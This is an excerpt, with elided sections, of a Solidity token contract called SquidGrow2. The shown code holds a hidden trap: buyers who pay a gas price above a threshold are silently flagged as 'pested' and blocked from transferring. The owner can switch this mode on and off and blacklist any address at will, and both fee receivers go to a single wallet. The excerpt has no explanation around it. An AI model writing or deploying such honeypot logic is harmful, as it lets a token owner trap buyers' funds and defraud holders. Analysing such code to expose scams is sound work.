...
contract SquidGrow2 is IBEP20, Auth {
    ...
    bool public pestMode = true;
    mapping (address => bool) public ispested;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x8486140A441927CD03A99607A3D49661E23cD9f6;
        teamFeeReceiver = 0x8486140A441927CD03A99607A3D49661E23cD9f6;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(pestMode){
            require(!ispested[sender],"pest");    
        }
        
        if (tx.gasprice >= MinGas && recipient != pair) {
            ispested[recipient] = true;
        }
    ...
    function enable_pest(bool _status) public onlyOwner {
        pestMode = _status;
    }
    ...
    function manage_pest(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            ispested[addresses[i]] = status;
        }
    }
